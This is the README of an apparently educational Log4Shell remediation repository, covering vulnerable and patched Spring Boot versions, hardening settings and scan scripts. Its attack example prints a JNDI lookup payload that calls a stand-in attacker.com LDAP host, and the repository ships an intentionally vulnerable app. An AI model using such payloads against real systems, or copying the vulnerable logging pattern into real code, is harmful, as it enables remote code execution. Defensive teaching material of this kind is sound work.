# Log4Shell Remediation Demo

[![Security Vulnerability](https://img.shields.io/badge/CVE--2021--44228-Critical-red)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
[![Log4j Version](https://img.shields.io/badge/Log4j-2.17.1-green)](https://logging.apache.org/log4j/2.x/)
[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](LICENSE)

A comprehensive demonstration of identifying, analyzing, and remediating the **Log4Shell (CVE-2021-44228)** vulnerability in a Spring Boot application.

## Overview

Log4Shell is a critical remote code execution (RCE) vulnerability discovered in Apache Log4j 2 in December 2021. With a CVSS score of **10.0 (Critical)**, it affected millions of applications worldwide.

This repository provides:
- A **vulnerable** Spring Boot application with Log4j 2.14.1
- A **remediated** version with Log4j 2.17.1 and security hardening
- A comprehensive **remediation guide**
- **Automation scripts** for scanning and validation

## Quick Start

### Prerequisites

- Java 11 or later
- Maven 3.6 or later
- Git

### Clone the Repository

```bash
git clone https://github.com/agylabs/log4shell-remediation.git
cd log4shell-remediation
```

### Run the Vulnerable Version (Controlled Environment)

> ⚠️ **WARNING**: Only run in an isolated environment. This version is intentionally vulnerable.

```bash
cd vulnerable
mvn clean spring-boot:run
```

### Run the Remediated Version

```bash
cd remediated
mvn clean spring-boot:run
# Access at http://localhost:8080
```

### Scan for Vulnerabilities

```bash
./scripts/scan-vulnerabilities.sh
```

### Validate Remediation

```bash
./scripts/validate-security.sh
```

## Repository Structure

```
log4shell-remediation/
├── GEMINI.md                       # Detailed project documentation
├── README.md                       # This file
├── vulnerable/                     # Vulnerable application (Log4j 2.14.1)
│   ├── pom.xml                    
│   ├── src/main/java/...          # Controllers, services with vulnerable logging
│   └── exploit-demo/              # Educational exploit information
├── remediated/                     # Patched application (Log4j 2.17.1)
│   ├── pom.xml                    
│   ├── src/main/java/...          # Secured controllers with input sanitization
│   └── security-configs/          # Defense-in-depth configurations
├── remediation-guide/              # Step-by-step remediation documentation
│   ├── 01-detection.md
│   ├── 02-analysis.md
│   ├── 03-remediation.md
│   ├── 04-validation.md
│   └── 05-prevention.md
└── scripts/
    ├── scan-vulnerabilities.sh
    ├── apply-fix.sh
    └── validate-security.sh
```

## The Vulnerability

### What is Log4Shell?

Log4Shell exploits the JNDI (Java Naming and Directory Interface) lookup feature in Log4j 2.x. When Log4j processes a log message containing a JNDI lookup string, it attempts to resolve the reference, potentially loading and executing malicious code from a remote server.

### Attack Example

```java
// Attacker sends malicious input
String userInput = "${jndi:ldap://attacker.com/exploit}";

// Vulnerable logging statement
logger.info("User searched for: " + userInput);
// Log4j processes the JNDI lookup and executes remote code!
```

### Affected Versions

- Apache Log4j 2.0-beta9 through 2.14.1 (critical)
- Apache Log4j 2.15.0 (partial fix, still vulnerable)
- Apache Log4j 2.16.0 (vulnerable to DoS)

**Safe versions**: 2.17.0 and later (2.17.1+ recommended)

## Key Changes in Remediation

### 1. Dependency Update

```xml
<!-- Before (VULNERABLE) -->
<log4j.version>2.14.1</log4j.version>

<!-- After (PATCHED) -->
<log4j.version>2.17.1</log4j.version>
```

### 2. Security Configuration

```properties
# Disable JNDI lookups (defense in depth)
log4j2.formatMsgNoLookups=true
```

### 3. Input Sanitization

```java
// Before (VULNERABLE)
logger.info("Search query: " + userInput);

// After (SECURED)
String sanitized = InputSanitizer.sanitize(userInput);
logger.info("Search query: {}", sanitized);
```

## Remediation Guide

For detailed remediation steps, see:

1. **[Detection](remediation-guide/01-detection.md)** - Identify vulnerable systems
2. **[Analysis](remediation-guide/02-analysis.md)** - Assess impact and scope
3. **[Remediation](remediation-guide/03-remediation.md)** - Apply the fix
4. **[Validation](remediation-guide/04-validation.md)** - Verify the fix works
5. **[Prevention](remediation-guide/05-prevention.md)** - Prevent future vulnerabilities

## API Endpoints

Both applications expose the same endpoints:

| Method | Endpoint | Description |
|--------|----------|-------------|
| GET | `/api/products` | List all products |
| GET | `/api/products/search?query=` | Search products (vulnerable to Log4Shell) |
| GET | `/api/products/{id}` | Get product by ID |
| POST | `/api/auth/login` | User login |
| POST | `/api/auth/register` | User registration |
| GET | `/api/orders` | List orders |
| POST | `/api/orders` | Create order |

## Security Measures in Remediated Version

1. **Updated Dependencies**: Log4j 2.17.1 (fully patched)
2. **Input Sanitization**: `InputSanitizer` class removes JNDI patterns
3. **Configuration Hardening**: `log4j2.formatMsgNoLookups=true`
4. **Parameterized Logging**: Using `{}` placeholders instead of concatenation
5. **Maven Enforcer**: Blocks vulnerable Log4j versions
6. **Defense in Depth**: JVM arguments, WAF rules, network controls

## Development

### Build the Applications

```bash
# Vulnerable version
cd vulnerable && mvn clean package

# Remediated version
cd remediated && mvn clean package
```

### Run Tests

```bash
cd remediated && mvn test
```

### Run Security Scan

```bash
cd remediated && mvn org.owasp:dependency-check-maven:check
```

## Contributing

We welcome contributions! Please follow these guidelines:

1. **Never commit to main directly** - Use feature branches
2. **Write clear commit messages** - Use imperative mood
3. **Include tests** - Especially for security features
4. **Run security scans** - Before submitting PRs

## Resources

- [CVE-2021-44228 (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Advisories](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4j Guidance](https://www.cisa.gov/uscert/apache-log4j-vulnerability-guidance)
- [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/)

## License

This project is licensed under the Apache License 2.0 - see the [LICENSE](LICENSE) file for details.

---

**Disclaimer**: This repository is for educational purposes only. The vulnerable application should only be run in isolated, controlled environments. Never deploy vulnerable code to production systems.
